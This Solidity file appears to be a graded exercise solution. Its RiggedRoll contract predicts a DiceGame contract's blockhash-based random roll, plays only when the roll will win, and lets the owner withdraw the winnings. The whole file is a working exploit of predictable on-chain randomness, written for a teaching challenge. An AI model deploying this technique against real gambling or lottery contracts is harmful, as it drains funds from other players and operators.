pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    uint256 public nonce = 0;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        //validate there is eth to withdraw
        require(address(this).balance >= _amount);
        payable(_addr).transfer(_amount);
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    /**
     * @dev Predicts the exact roll number of DiceGame, copy the exact way the roll number is generated
     * Send a message value of at least .002 -
     */
    function riggedRoll() public payable {
        require(
            address(this).balance >= 0.002 ether,
            "Failed to send enough value"
        );

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGame, nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Roll:", roll);
        console.log("\t", "   Rigged Nonce:", nonce);
        console.log("\t", "   Riggedprev blockNumber:", block.number - 1);
        console.log("\t", "   Rigged hash:", uint256(hash));

        nonce++;

        //return if not a winner
        if (roll > 2) {
            console.log("Loser");
            return;
        }

        //if winning numbers then call rollTheDice() fro DiceGame to win
        console.log("Winner");
        diceGame.rollTheDice{value: .002 ether}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
